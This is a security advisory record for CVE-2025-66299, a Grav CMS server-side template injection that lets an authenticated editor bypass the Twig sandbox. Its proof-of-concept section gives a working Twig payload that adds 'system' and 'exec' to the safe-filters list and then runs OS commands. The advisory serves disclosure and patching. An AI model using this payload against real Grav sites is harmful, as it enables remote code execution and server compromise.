advisory_id: GHSA-gjc5-8cfh-653x
datasource_id: github_osv_importer_v2/GHSA-gjc5-8cfh-653x
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-gjc5-8cfh-653x/GHSA-gjc5-8cfh-653x.json
aliases:
  - CVE-2025-66299
summary: |
  Grav is Vulnerable to Security Sandbox Bypass with SSTI (Server Side Template Injection)
  ## Summary

  Grav CMS is vulnerable to a Server-Side Template Injection (SSTI) that allows any authenticated user with editor permissions to execute arbitrary code on the remote server, bypassing the existing security sandbox.

  ## Details

  Grav CMS uses a custom sandbox to protect the powerful Twig methods such as `registerUndefinedFilterCallback()`. These methods are designed to prevent SSTI attacks by denying the execution of dangerous PHP functions (e.g., `exec()`, `passthru()`, `system()`, etc.) within Twig template directives.

  The current defense mechanism relies on a blacklist of prohibited functions (PHP, Twig), checked through the `isDangerousFunction()` method in the file `system/src/Grav/Common/Twig.php`:

  ```php
  $this->twig->registerUndefinedFilterCallback(function (string $name) use ($config) {
      $allowed = $config->get('system.twig.safe_filters');
      if (is_array($allowed) && in_array($name, $allowed, true) && function_exists($name)) {
          return new TwigFilter($name, $name);
      }
      if ($config->get('system.twig.undefined_filters')) {
          if (function_exists($name)) {
              if (!Utils::isDangerousFunction($name)) {
                  user_error("PHP function {$name}() used as Twig filter. This is deprecated in Grav 1.7. Please add it to system configuration: `system.twig.safe_filters`", E_USER_DEPRECATED);

                  return new TwigFilter($name, $name);
              }

              /** @var Debugger $debugger */
              $debugger = $this->grav['debugger'];
              $debugger->addException(new RuntimeException("Blocked potentially dangerous PHP function {$name}() being used as Twig filter. If you really want to use it, please add it to system configuration: `system.twig.safe_filters`"));
          }

          return new TwigFilter($name, static function () {});
      }

      return false;
  });
  ```

  In this code, the `isDangerousFunction()` check is bypassed if the filter defined in the $name variable is considered safe. Only an administrator can mark a function as safe by adding it to the `system.twig.safe_filters` configuration properties (whitelists that are empty by default) in the `system/config/system.yaml` file.

  Notably, the Twig class is defined within the `system/src/Grav/Common/Twig.php` file, and the Twig object (and environment) is instantiated there:

  ```php
  /**
   * Class Twig
   * @package Grav\Common\Twig
   */
  class Twig
  {
      /** @var Environment */
      public $twig;
      /** @var array */
      public $twig_vars = [];
      /** @var array */
      public $twig_paths;
      /** @var string */
      public $template;

      // Constructor
      public function __construct(Grav $grav)
      {
          $this->grav = $grav;
          $this->twig_paths = [];
      }

      // Twig initialization method
      public function init()
      {
          if (null === $this->twig) {
              /** @var Config $config */
              $config = $this->grav['config'];
              /** @var UniformResourceLocator $locator */
              $locator = $this->grav['locator'];
              /** @var Language $language */
              $language = $this->grav['language'];

              $active_language = $language->getActive();
          ...
          }
      }
  }
  ```

  Since the security sandbox does not fully protect the Twig object, it is possible to interact with it (e.g., call methods, read/write attributes) through maliciously crafted Twig template directives injected into a web page. This allows an authenticated editor to add arbitrary functions to the Twig attribute `system.twig.safe_filters`, effectively bypassing the Grav CMS sandbox.

  ## Proof of Concept (PoC)
  An authenticated user with permission to edit a page (with Twig processing enabled) in the Grav CMS admin console can inject malicious template directives to execute arbitrary OS commands on the remote web server.

  For example, to exploit the vulnerability and execute the prohibited `system('id')` command, bypassing the sandbox, an editor could create/edit a web page with the following template directives:

  ```twig
  {% set arr = {'1':'system', '2':'exec'} %}
  {{ var_dump(grav.twig.twig_vars['config'].set('system.twig.safe_filters', arr)) }}
  {{ 'id'|system }}
  {{ 'whoami'|exec }}
  ```

  Once the page is saved, it can be accessed by unauthenticated users, triggering the execution of the `system('id')` command on the server hosting the vulnerable Grav CMS.

  ## Impact
  The vulnerability allows remote code execution on the underlying server, which could lead to full server compromise.
impacted_packages:
  - purl: pkg:composer/getgrav/grav
    affected_versions: vers:composer/<1.8.0-beta.27
    fixed_versions: vers:composer/1.8.0-beta.27
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '8.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-gjc5-8cfh-653x/GHSA-gjc5-8cfh-653x.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-1336
  - CWE-94
references:
  - url: https://github.com/getgrav/grav
    reference_type:
    reference_id:
  - url: https://github.com/getgrav/grav/commit/e37259527d9c1deb6200f8967197a9fa587c6458
    reference_type:
    reference_id:
  - url: https://github.com/getgrav/grav/security/advisories/GHSA-gjc5-8cfh-653x
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-66299
    reference_type:
    reference_id:
